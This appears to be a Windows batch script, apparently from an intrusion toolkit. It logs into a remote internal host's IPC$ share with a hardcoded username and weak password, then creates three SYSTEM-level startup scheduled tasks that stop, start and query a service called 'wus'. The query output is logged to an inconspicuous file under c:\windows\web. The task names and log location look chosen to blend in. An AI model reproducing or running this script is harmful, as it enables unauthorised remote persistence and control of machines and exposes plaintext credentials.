@echo off
net use \\172.30.227.16\ipc$ /u:s.krivtsov "123456"
schtasks /create /s 172.30.227.16 /u s.krivtsov /p 123456 /tn sqs /tr "cmd.exe /c sc stop wus"  /sc onstart /ru system /f
schtasks /create /s 172.30.227.16 /u s.krivtsov /p 123456 /tn sql /tr "cmd.exe /c sc start wus"  /sc onstart /ru system /f
schtasks /create /s 172.30.227.16 /u s.krivtsov /p 123456 /tn sqc /tr "cmd.exe /c sc query wus >> c:\windows\web\alg.log" /sc onstart /ru system /f
